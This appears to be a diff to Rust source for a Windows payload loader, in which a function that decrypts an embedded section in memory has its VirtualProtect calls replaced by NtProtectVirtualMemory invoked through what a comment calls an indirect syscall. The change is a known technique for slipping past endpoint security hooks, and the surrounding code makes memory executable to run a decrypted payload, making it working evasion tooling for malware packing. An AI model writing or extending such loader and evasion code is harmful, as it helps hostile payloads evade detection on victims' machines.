@@ -1,7 +1,6 @@
 #![allow(dead_code)]
 
-#[cfg(windows)]
-use winapi::um::memoryapi::VirtualProtect;
+// VirtualProtect removed — using NtProtectVirtualMemory indirect syscall
 #[cfg(windows)]
 use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
 
@@ -79,12 +78,16 @@ pub unsafe fn decrypt_payload() {
             }
 
             let section_ptr = (image_base + virtual_addr) as *mut u8;
+            let mut base_addr = section_ptr as usize;
+            let mut prot_size = tagged_span;
             let mut old_protect: u32 = 0;
-            VirtualProtect(
-                section_ptr as _,
-                tagged_span,
-                PAGE_EXECUTE_READWRITE,
-                &mut old_protect,
+            let _ = syscall!(
+                "NtProtectVirtualMemory",
+                (-1isize) as u64,
+                &mut base_addr as *mut _ as u64,
+                &mut prot_size as *mut _ as u64,
+                PAGE_EXECUTE_READWRITE as u64,
+                &mut old_protect as *mut u32 as u64,
             );
 
             let ciphertext = core::slice::from_raw_parts(section_ptr as *const u8, virtual_size);
@@ -100,11 +103,16 @@ pub unsafe fn decrypt_payload() {
             if !ct_eq_16(&supplied_tag, &expected_tag) {
                 // Fail-safe on tamper: wipe .data and stop.
                 core::ptr::write_bytes(section_ptr, 0, virtual_size);
-                VirtualProtect(
-                    section_ptr as _,
-                    tagged_span,
-                    PAGE_READWRITE,
-                    &mut old_protect,
+                let mut base_addr2 = section_ptr as usize;
+                let mut prot_size2 = tagged_span;
+                let mut old_protect2: u32 = 0;
+                let _ = syscall!(
+                    "NtProtectVirtualMemory",
+                    (-1isize) as u64,
+                    &mut base_addr2 as *mut _ as u64,
+                    &mut prot_size2 as *mut _ as u64,
+                    PAGE_READWRITE as u64,
+                    &mut old_protect2 as *mut u32 as u64,
                 );
                 return;
             }
@@ -116,11 +124,16 @@ pub unsafe fn decrypt_payload() {
             // Restore .data to PAGE_READWRITE so the loaded process can write
             // global variables at runtime; making it PAGE_EXECUTE_READ would
             // crash on the first write to a static (H-8).
-            VirtualProtect(
-                section_ptr as _,
-                tagged_span,
-                PAGE_READWRITE,
-                &mut old_protect,
+            let mut base_addr3 = section_ptr as usize;
+            let mut prot_size3 = tagged_span;
+            let mut old_protect3: u32 = 0;
+            let _ = syscall!(
+                "NtProtectVirtualMemory",
+                (-1isize) as u64,
+                &mut base_addr3 as *mut _ as u64,
+                &mut prot_size3 as *mut _ as u64,
+                PAGE_READWRITE as u64,
+                &mut old_protect3 as *mut u32 as u64,
             );
             break;
         }
